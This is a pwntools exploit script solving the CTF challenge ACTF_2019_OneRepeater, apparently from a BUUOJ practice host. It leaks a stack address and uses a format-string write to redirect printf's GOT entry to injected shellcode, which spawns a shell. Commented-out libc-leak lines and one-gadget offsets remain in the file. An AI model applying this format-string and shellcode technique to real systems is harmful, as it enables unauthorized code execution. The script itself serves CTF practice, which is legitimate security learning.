import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ACTF_2019_OneRepeater')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ACTF_2019_OneRepeater')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',28116)
			elf=ELF('./ACTF_2019_OneRepeater')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		
		

		io.recv()
		io.sendline('1')
		stack_addr=int(io.recv(8),16)
		target_addr=stack_addr+0x200
		pay=fmtstr_payload(16,{elf.got['printf']:target_addr},write_size='byte')
		pay=pay.ljust(0x200,'\x00')+asm(shellcraft.sh())
		io.sendline(pay)
		io.recv()
		io.sendline('2')
		io.sendline('2')







		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))



		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue